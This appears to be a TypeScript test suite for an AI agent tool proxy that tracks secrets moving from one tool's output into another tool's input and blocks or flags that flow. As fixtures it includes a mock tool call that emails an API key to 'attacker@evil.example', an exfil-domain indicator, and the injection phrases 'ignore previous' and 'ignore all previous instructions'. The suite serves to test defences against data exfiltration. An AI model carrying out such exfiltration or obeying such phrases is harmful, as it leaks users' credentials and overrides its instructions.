import { describe, it, expect } from 'vitest';

import { SessionProvenance, DEFAULT_MAX_TAINT_ENTRIES } from '../../src/proxy/provenance.js';
import type { TaintTag } from '../../src/proxy/provenance.js';
import { evaluateCall, evaluateResponse } from '../../src/proxy/policy.js';
import type { EvalContext, ProxyPolicy } from '../../src/proxy/policy.js';
import type { InspectionResult, ResponseFinding } from '../../src/proxy/response-inspector.js';

// ─────────────────────────────────────────────────────────────────────────
// Test helpers
// ─────────────────────────────────────────────────────────────────────────

function makePolicy(overrides: Partial<ProxyPolicy> = {}): ProxyPolicy {
  return {
    version: 1,
    mode: 'enforce',
    onError: 'open',
    limits: { maxScanBytes: 1_048_576 },
    rules: [],
    response: { redactSecrets: false, injection: 'alert' },
    ...overrides,
  };
}

function secretFinding(match: string, overrides: Partial<ResponseFinding> = {}): ResponseFinding {
  return { category: 'secret', name: 'Potential secret in response', severity: 'high', match, ...overrides };
}

const SECRET_A = 'sk-testtokenAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
const SECRET_B = 'sk-testtokenBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';

// ─────────────────────────────────────────────────────────────────────────
// (1) Backward compatibility: no EvalContext -> identical to today's
// behavior. This is the acceptance bar — a reviewer will specifically try
// to break it. Every scenario below is checked FOUR ways: ctx entirely
// omitted, ctx explicitly `undefined`, ctx `{}` (no provenance), and ctx
// carrying a freshly-constructed, untainted `SessionProvenance` — all four
// must produce the exact same decision.
// ─────────────────────────────────────────────────────────────────────────

describe('backward compatibility: evaluateCall/evaluateResponse with no EvalContext', () => {
  function assertAllVariantsIdentical(run: (ctx?: EvalContext) => unknown, expected: unknown): void {
    const freshProvenance = new SessionProvenance();
    expect(run()).toEqual(expected); // omitted entirely
    expect(run(undefined)).toEqual(expected); // explicit undefined
    expect(run({})).toEqual(expected); // ctx present, no provenance
    expect(run({ provenance: freshProvenance })).toEqual(expected); // ctx + untainted provenance
  }

  it('evaluateCall: no rules -> allow, identical across all ctx variants', () => {
    const policy = makePolicy();
    assertAllVariantsIdentical(
      (ctx) => evaluateCall(policy, 'tools/call', 'any_tool', { x: 1 }, ctx),
      { action: 'allow', direction: 'request' },
    );
  });

  it('evaluateCall: a matched deny rule in enforce mode, identical across all ctx variants', () => {
    const policy = makePolicy({
      mode: 'enforce',
      rules: [
        {
          id: 'block-danger',
          direction: 'request',
          toolMatchers: [/^danger_tool$/],
          action: 'deny',
          message: 'blocked',
        },
      ],
    });
    assertAllVariantsIdentical(
      (ctx) => evaluateCall(policy, 'tools/call', 'danger_tool', {}, ctx),
      { action: 'deny', ruleId: 'block-danger', message: 'blocked', direction: 'request' },
    );
  });

  it('evaluateCall: the same deny rule downgrades to coach in alert mode, identical across all ctx variants', () => {
    const policy = makePolicy({
      mode: 'alert',
      rules: [{ id: 'block-danger', direction: 'request', toolMatchers: [/^danger_tool$/], action: 'deny' }],
    });
    assertAllVariantsIdentical(
      (ctx) => evaluateCall(policy, 'tools/call', 'danger_tool', {}, ctx).action,
      'coach',
    );
  });

  it('evaluateCall: observe mode forces alert regardless of rule action, identical across all ctx variants', () => {
    const policy = makePolicy({
      mode: 'observe',
      rules: [{ id: 'block-danger', direction: 'request', toolMatchers: [/^danger_tool$/], action: 'deny' }],
    });
    assertAllVariantsIdentical(
      (ctx) => evaluateCall(policy, 'tools/call', 'danger_tool', {}, ctx).action,
      'alert',
    );
  });

  it('evaluateCall: first-match-wins among rules, identical across all ctx variants', () => {
    const policy = makePolicy({
      mode: 'enforce',
      rules: [
        { id: 'first-allow', direction: 'request', toolMatchers: [/^run_/], action: 'allow' },
        { id: 'second-deny', direction: 'request', toolMatchers: [/^run_/], action: 'deny' },
      ],
    });
    assertAllVariantsIdentical(
      (ctx) => evaluateCall(policy, 'tools/call', 'run_shell', {}, ctx),
      { action: 'allow', ruleId: 'first-allow', message: undefined, direction: 'request' },
    );
  });

  it('evaluateCall: never throws on weird args, identical across all ctx variants', () => {
    const policy = makePolicy();
    for (const weird of ['a string', 42, null, undefined, ['array']]) {
      assertAllVariantsIdentical(
        (ctx) => evaluateCall(policy, 'tools/call', 'any_tool', weird, ctx),
        { action: 'allow', direction: 'request' },
      );
    }
  });

  it('evaluateResponse: clean inspection -> allow, identical across all ctx variants', () => {
    const policy = makePolicy();
    const inspection: InspectionResult = { findings: [] };
    assertAllVariantsIdentical(
      (ctx) => evaluateResponse(policy, 'any_tool', inspection, ctx),
      { action: 'allow', direction: 'response' },
    );
  });

  it('evaluateResponse: secret finding + redactSecrets -> redact, identical across all ctx variants', () => {
    const policy = makePolicy({ response: { redactSecrets: true, injection: 'alert' } });
    const inspection: InspectionResult = { findings: [secretFinding(SECRET_A)] };
    assertAllVariantsIdentical(
      (ctx) => evaluateResponse(policy, 'any_tool', inspection, ctx).action,
      'redact',
    );
  });

  it('evaluateResponse: injection finding + injection:deny -> deny in enforce mode, identical across all ctx variants', () => {
    const policy = makePolicy({ mode: 'enforce', response: { redactSecrets: false, injection: 'deny' } });
    const inspection: InspectionResult = {
      findings: [{ category: 'injection', name: 'Role reassignment', severity: 'high', match: 'ignore previous' }],
    };
    assertAllVariantsIdentical(
      (ctx) => evaluateResponse(policy, 'any_tool', inspection, ctx).action,
      'deny',
    );
  });

  it('evaluateResponse: explicit response-direction rule, identical across all ctx variants', () => {
    const policy = makePolicy({
      mode: 'enforce',
      rules: [{ id: 'resp-rule', direction: 'response', toolMatchers: [], action: 'alert', message: 'watch this' }],
    });
    const inspection: InspectionResult = { findings: [] };
    assertAllVariantsIdentical(
      (ctx) => evaluateResponse(policy, 'any_tool', inspection, ctx),
      { action: 'alert', ruleId: 'resp-rule', message: 'watch this', direction: 'response' },
    );
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (2) Core dataflow behavior, driven through evaluateCall/evaluateResponse
// via EvalContext (this is what a real g0 proxy session does).
// ─────────────────────────────────────────────────────────────────────────

describe('provenance-driven dataflow decisions (via EvalContext)', () => {
  it('tool A response taint reappearing in tool B request args yields a dataflow finding (deny in enforce mode)', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('read_file', 'filesystem-server', [secretFinding(SECRET_A)]);

    const policy = makePolicy({ mode: 'enforce' });
    const ctx: EvalContext = { provenance, destinationTool: 'send_email', destinationServer: 'filesystem-server' };
    const decision = evaluateCall(policy, 'tools/call', 'send_email', { body: `please send ${SECRET_A} now` }, ctx);

    expect(decision.action).toBe('deny');
    expect(decision.signals).toContain('dataflow:read_file->send_email');
    expect(decision.message).toContain('read_file');
    expect(decision.message).toContain('send_email');
  });

  it('same tool re-consuming its own prior output is NOT a dataflow finding', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('read_file', 'filesystem-server', [secretFinding(SECRET_A)]);

    const policy = makePolicy({ mode: 'enforce' });
    const ctx: EvalContext = { provenance, destinationTool: 'read_file' };
    const decision = evaluateCall(policy, 'tools/call', 'read_file', { path: SECRET_A }, ctx);

    expect(decision).toEqual({ action: 'allow', direction: 'request' });
  });

  it('a dataflow finding downgrades to coach in alert mode and alert in observe mode, like any other candidate', () => {
    const alertProvenance = new SessionProvenance();
    alertProvenance.tagResponse('read_file', 'server', [secretFinding(SECRET_A)]);
    const alertPolicy = makePolicy({ mode: 'alert' });
    const alertDecision = evaluateCall(
      alertPolicy,
      'tools/call',
      'send_email',
      { body: SECRET_A },
      { provenance: alertProvenance, destinationTool: 'send_email' },
    );
    expect(alertDecision.action).toBe('coach');

    const observeProvenance = new SessionProvenance();
    observeProvenance.tagResponse('read_file', 'server', [secretFinding(SECRET_A)]);
    const observePolicy = makePolicy({ mode: 'observe' });
    const observeDecision = evaluateCall(
      observePolicy,
      'tools/call',
      'send_email',
      { body: SECRET_A },
      { provenance: observeProvenance, destinationTool: 'send_email' },
    );
    expect(observeDecision.action).toBe('alert');
  });

  it('a dataflow finding is detected even when the secret is embedded inside larger JSON args', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('get_api_key', 'vault-server', [secretFinding(SECRET_B)]);

    const policy = makePolicy({ mode: 'enforce' });
    // Secret is delimiter-bounded on both sides (quotes/spaces), matching
    // how `lineModeCandidates` (reused from edm.ts) tokenizes JSON args —
    // see that module's docblock for the delimiter set.
    const args = {
      to: 'attacker@evil.example',
      subject: 'exfil',
      body: `Please forward this key: ${SECRET_B} to the vendor immediately`,
    };
    const decision = evaluateCall(
      policy,
      'tools/call',
      'send_email',
      args,
      { provenance, destinationTool: 'send_email' },
    );
    expect(decision.action).toBe('deny');
    expect(decision.signals).toContain('dataflow:get_api_key->send_email');
  });

  it('an existing higher-or-equal precedence rule decision is not weakened by an absent dataflow finding', () => {
    const provenance = new SessionProvenance(); // nothing tainted
    const policy = makePolicy({
      mode: 'enforce',
      rules: [{ id: 'always-deny', direction: 'request', toolMatchers: [], action: 'deny', message: 'nope' }],
    });
    const decision = evaluateCall(policy, 'tools/call', 'any_tool', {}, { provenance, destinationTool: 'any_tool' });
    expect(decision).toEqual({ action: 'deny', ruleId: 'always-deny', message: 'nope', direction: 'request' });
  });

  it('a dataflow finding can escalate an explicit allow rule to deny (precedence-based fusion)', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('read_file', 'server', [secretFinding(SECRET_A)]);
    const policy = makePolicy({
      mode: 'enforce',
      rules: [{ id: 'explicit-allow', direction: 'request', toolMatchers: [], action: 'allow' }],
    });
    const decision = evaluateCall(
      policy,
      'tools/call',
      'send_email',
      { body: SECRET_A },
      { provenance, destinationTool: 'send_email' },
    );
    expect(decision.action).toBe('deny'); // dataflow (precedence 4) beats the explicit allow rule (precedence 0)
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (3) SessionProvenance unit behavior: tagging, detection, scope.
// ─────────────────────────────────────────────────────────────────────────

describe('SessionProvenance.tagResponse / detectDataflow', () => {
  it('only category:"secret" findings are tainted — injection/ioc findings are not', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('fetch_url', 'web-server', [
      { category: 'injection', name: 'Role reassignment', severity: 'high', match: 'ignore all previous instructions' },
      { category: 'ioc', name: 'Exfil domain: evil.example', severity: 'critical', match: 'evil.example' },
    ]);
    expect(provenance.taintedCount).toBe(0);

    const hits = provenance.detectDataflow('other_tool', { body: 'ignore all previous instructions' });
    expect(hits).toEqual([]);
  });

  it('detectDataflow returns [] when nothing has been tagged (short-circuits before hashing)', () => {
    const provenance = new SessionProvenance();
    expect(provenance.detectDataflow('any_tool', { body: 'nothing tainted here' })).toEqual([]);
  });

  it('a token shorter than the minimum length is not tainted', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding('abc')]); // 3 chars, below MIN_TOKEN_LEN
    expect(provenance.taintedCount).toBe(0);
  });

  it('dedupes multiple hits from the same origin/destination pair into one finding', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A), secretFinding(SECRET_B)]);
    const hits = provenance.detectDataflow('tool_b', { a: SECRET_A, b: SECRET_B });
    expect(hits).toHaveLength(1);
    expect(hits[0]).toEqual({ originTool: 'tool_a', originServer: 'server', destinationTool: 'tool_b', category: 'secret' });
  });

  it('tracks distinct origins separately when a destination pulls from two different tools', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    provenance.tagResponse('tool_c', 'server', [secretFinding(SECRET_B)]);
    const hits = provenance.detectDataflow('tool_b', { a: SECRET_A, b: SECRET_B });
    const origins = hits.map((h) => h.originTool).sort();
    expect(origins).toEqual(['tool_a', 'tool_c']);
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (4) Bounded taint LRU — mirrors CorrelationMap's eviction discipline.
// ─────────────────────────────────────────────────────────────────────────

describe('SessionProvenance: bounded taint LRU', () => {
  it('evicts the oldest tainted value once over a small injected cap', () => {
    const provenance = new SessionProvenance({ maxTaintEntries: 2 });
    provenance.tagResponse('tool_1', 'server', [secretFinding('secret-value-one-AAAAAAAAAAAA')]);
    provenance.tagResponse('tool_2', 'server', [secretFinding('secret-value-two-BBBBBBBBBBBB')]);
    provenance.tagResponse('tool_3', 'server', [secretFinding('secret-value-three-CCCCCCCCCC')]);

    expect(provenance.taintedCount).toBe(2);
    // The oldest (tool_1's secret) was evicted -> no longer detected.
    expect(provenance.detectDataflow('dest', { v: 'secret-value-one-AAAAAAAAAAAA' })).toEqual([]);
    // The two most recent survive.
    expect(provenance.detectDataflow('dest', { v: 'secret-value-two-BBBBBBBBBBBB' })).toHaveLength(1);
    expect(provenance.detectDataflow('dest', { v: 'secret-value-three-CCCCCCCCCC' })).toHaveLength(1);
  });

  it('defaults to DEFAULT_MAX_TAINT_ENTRIES and never exceeds it under heavy load', () => {
    const provenance = new SessionProvenance({ maxTaintEntries: 50 });
    for (let i = 0; i < 500; i++) {
      provenance.tagResponse(`tool_${i}`, 'server', [secretFinding(`unique-secret-value-number-${i}-XYZ`)]);
    }
    expect(provenance.taintedCount).toBe(50);
    expect(provenance.taintedCount).toBeLessThanOrEqual(DEFAULT_MAX_TAINT_ENTRIES);
  });

  it('re-tagging an already-tainted value refreshes its recency (delete-then-set)', () => {
    const provenance = new SessionProvenance({ maxTaintEntries: 2 });
    provenance.tagResponse('tool_1', 'server', [secretFinding('secret-value-one-AAAAAAAAAAAA')]);
    provenance.tagResponse('tool_2', 'server', [secretFinding('secret-value-two-BBBBBBBBBBBB')]);
    // Re-tag secret-one (from a different tool this time) — this should
    // refresh it to most-recently-inserted, so the NEXT insert evicts
    // secret-two instead.
    provenance.tagResponse('tool_1b', 'server', [secretFinding('secret-value-one-AAAAAAAAAAAA')]);
    provenance.tagResponse('tool_3', 'server', [secretFinding('secret-value-three-CCCCCCCCCC')]);

    expect(provenance.detectDataflow('dest', { v: 'secret-value-two-BBBBBBBBBBBB' })).toEqual([]); // evicted
    expect(provenance.detectDataflow('dest', { v: 'secret-value-one-AAAAAAAAAAAA' })).toHaveLength(1); // refreshed, survives
    expect(provenance.detectDataflow('dest', { v: 'secret-value-three-CCCCCCCCCC' })).toHaveLength(1); // newest, survives
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (5) Bounded volume/velocity counters.
// ─────────────────────────────────────────────────────────────────────────

describe('SessionProvenance: bounded volume/velocity counters', () => {
  it('getVolumeStats returns undefined for a tool that has never been tagged', () => {
    const provenance = new SessionProvenance();
    expect(provenance.getVolumeStats('never_seen')).toBeUndefined();
  });

  it('tracks totalTagged and windowCount for a tool that emitted several secrets', () => {
    const provenance = new SessionProvenance({ velocityWindowMs: 60_000 });
    provenance.tagResponse('chatty_tool', 'server', [secretFinding(SECRET_A), secretFinding(SECRET_B)]);
    const stats = provenance.getVolumeStats('chatty_tool');
    expect(stats).toBeDefined();
    expect(stats?.totalTagged).toBe(2);
    expect(stats?.windowCount).toBe(2);
  });

  it('windowCount excludes tags older than the velocity window', async () => {
    const provenance = new SessionProvenance({ velocityWindowMs: 20 });
    provenance.tagResponse('chatty_tool', 'server', [secretFinding(SECRET_A)]);
    await new Promise((resolve) => setTimeout(resolve, 40));
    const stats = provenance.getVolumeStats('chatty_tool');
    expect(stats?.totalTagged).toBe(1); // total is never windowed
    expect(stats?.windowCount).toBe(0); // but this tag aged out of the window
  });

  it('an explicit windowMs override on getVolumeStats takes precedence over the instance default', () => {
    const provenance = new SessionProvenance({ velocityWindowMs: 60_000 });
    provenance.tagResponse('chatty_tool', 'server', [secretFinding(SECRET_A)]);
    const stats = provenance.getVolumeStats('chatty_tool', 5); // 5ms window, essentially "just now"
    expect(stats?.windowMs).toBe(5);
  });

  it('bounds the number of distinct tools tracked (evicts oldest tool once over cap)', () => {
    const provenance = new SessionProvenance({ maxVolumeTools: 2 });
    provenance.tagResponse('tool_1', 'server', [secretFinding('value-one-AAAAAAAAAAAAAAAA')]);
    provenance.tagResponse('tool_2', 'server', [secretFinding('value-two-BBBBBBBBBBBBBBBB')]);
    provenance.tagResponse('tool_3', 'server', [secretFinding('value-three-CCCCCCCCCCCCCC')]);

    expect(provenance.getVolumeStats('tool_1')).toBeUndefined(); // evicted
    expect(provenance.getVolumeStats('tool_2')).toBeDefined();
    expect(provenance.getVolumeStats('tool_3')).toBeDefined();
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (6) Never throw / fail-open.
// ─────────────────────────────────────────────────────────────────────────

describe('SessionProvenance: never throws / fail-open', () => {
  it('tagResponse never throws on garbage findings input', () => {
    const provenance = new SessionProvenance();
    expect(() => provenance.tagResponse('t', 's', null as unknown as ResponseFinding[])).not.toThrow();
    expect(() => provenance.tagResponse('t', 's', undefined as unknown as ResponseFinding[])).not.toThrow();
    expect(() => provenance.tagResponse('t', 's', 'not-an-array' as unknown as ResponseFinding[])).not.toThrow();
    expect(() =>
      provenance.tagResponse('t', 's', [null, undefined, {}, { category: 'secret' }] as unknown as ResponseFinding[]),
    ).not.toThrow();
  });

  it('detectDataflow never throws on a circular-reference args object', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    const circular: Record<string, unknown> = { a: 1 };
    circular.self = circular;
    expect(() => provenance.detectDataflow('tool_b', circular)).not.toThrow();
  });

  it('detectDataflow never throws on non-object/garbage args', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    for (const weird of [null, undefined, 42, 'a string', Symbol('x'), () => {}]) {
      expect(() => provenance.detectDataflow('tool_b', weird)).not.toThrow();
    }
  });

  it('getVolumeStats never throws on a negative/NaN windowMs override', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    expect(() => provenance.getVolumeStats('tool_a', -1)).not.toThrow();
    expect(() => provenance.getVolumeStats('tool_a', NaN)).not.toThrow();
  });

  it('a throwing provenance object does not propagate out of evaluateCall/evaluateResponse (policy-level fail-open)', () => {
    const throwingProvenance = {
      detectDataflow: () => {
        throw new Error('boom');
      },
      getVolumeStats: () => {
        throw new Error('boom');
      },
      tagResponse: () => {
        throw new Error('boom');
      },
      taintedCount: 0,
    };
    const policy = makePolicy();
    const ctx = { provenance: throwingProvenance as unknown as EvalContext['provenance'] };

    expect(() => evaluateCall(policy, 'tools/call', 'any_tool', {}, ctx)).not.toThrow();
    expect(evaluateCall(policy, 'tools/call', 'any_tool', {}, ctx).action).toBe('allow');

    const inspection: InspectionResult = { findings: [] };
    expect(() => evaluateResponse(policy, 'any_tool', inspection, ctx)).not.toThrow();
    expect(evaluateResponse(policy, 'any_tool', inspection, ctx).action).toBe('allow');
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (7) Plaintext never leaks — a TaintTag holds only a hash.
// ─────────────────────────────────────────────────────────────────────────

describe('SessionProvenance: plaintext never leaks', () => {
  it('the internal TaintTag stores a SHA-256 hash, never the plaintext secret', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);

    const internalTags = (provenance as unknown as { tags: Map<string, TaintTag> }).tags;
    expect(internalTags.size).toBe(1);
    const [tag] = [...internalTags.values()];
    expect(tag.valueHash).toMatch(/^[a-f0-9]{64}$/); // SHA-256 hex digest shape
    expect(tag.valueHash).not.toBe(SECRET_A);
    expect(tag.valueHash).not.toContain(SECRET_A);
    // Nothing on the tag (or anywhere reachable off the provenance
    // instance) carries the plaintext.
    expect(JSON.stringify(tag)).not.toContain(SECRET_A);
  });

  it('a DataflowFinding never carries the matched value, only tool/server/category metadata', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    const hits = provenance.detectDataflow('tool_b', { v: SECRET_A });
    expect(hits).toHaveLength(1);
    expect(JSON.stringify(hits)).not.toContain(SECRET_A);
    expect(Object.keys(hits[0]).sort()).toEqual(['category', 'destinationTool', 'originServer', 'originTool']);
  });

  it('the PolicyDecision produced by a dataflow finding never carries the matched value', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    const policy = makePolicy({ mode: 'enforce' });
    const decision = evaluateCall(
      policy,
      'tools/call',
      'tool_b',
      { v: SECRET_A },
      { provenance, destinationTool: 'tool_b' },
    );
    expect(JSON.stringify(decision)).not.toContain(SECRET_A);
  });
});

// ─────────────────────────────────────────────────────────────────────────
// (8) Bounded work on huge/adversarial input.
// ─────────────────────────────────────────────────────────────────────────

describe('SessionProvenance: bounded work on huge/adversarial input', () => {
  it('detectDataflow skips scanning entirely once args text exceeds maxScanBytes', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    const huge = { blob: SECRET_A + 'x'.repeat(2_000_000) }; // ~2MB, over a 1MB budget
    const start = Date.now();
    const hits = provenance.detectDataflow('tool_b', huge, 1_048_576);
    expect(hits).toEqual([]); // skipped, not scanned -> the taint is not found
    expect(Date.now() - start).toBeLessThan(100);
  });

  it('detectDataflow stays fast and never throws on a large adversarial args payload (token flood) within budget', () => {
    const provenance = new SessionProvenance();
    provenance.tagResponse('tool_a', 'server', [secretFinding(SECRET_A)]);
    // ~230KB of many short, distinct delimiter-bounded tokens, safely within
    // the default 1MB budget, plus the real tainted secret buried at the end.
    const filler = Array.from({ length: 10_000 }, (_, i) => `field_${i}=value_${i}`).join('&');
    const args = { blob: `${filler}&needle=${SECRET_A}` };
    expect(args.blob.length).toBeLessThan(1_048_576); // sanity: stays under the scan budget
    const start = Date.now();
    let hits: ReturnType<SessionProvenance['detectDataflow']> = [];
    expect(() => {
      hits = provenance.detectDataflow('tool_b', args);
    }).not.toThrow();
    expect(Date.now() - start).toBeLessThan(2000);
    expect(hits).toHaveLength(1); // the real secret is still found despite the flood of filler
  });

  it('tagResponse stays bounded even given far more findings than MAX_TAGS_PER_RESPONSE', () => {
    const provenance = new SessionProvenance();
    const manyFindings = Array.from({ length: 500 }, (_, i) => secretFinding(`flood-secret-value-${i}-ZZZZZZZZ`));
    const start = Date.now();
    expect(() => provenance.tagResponse('flood_tool', 'server', manyFindings)).not.toThrow();
    expect(Date.now() - start).toBeLessThan(500);
    // Bounded: not all 500 distinct secrets got tagged in one call.
    expect(provenance.taintedCount).toBeLessThan(500);
  });
});
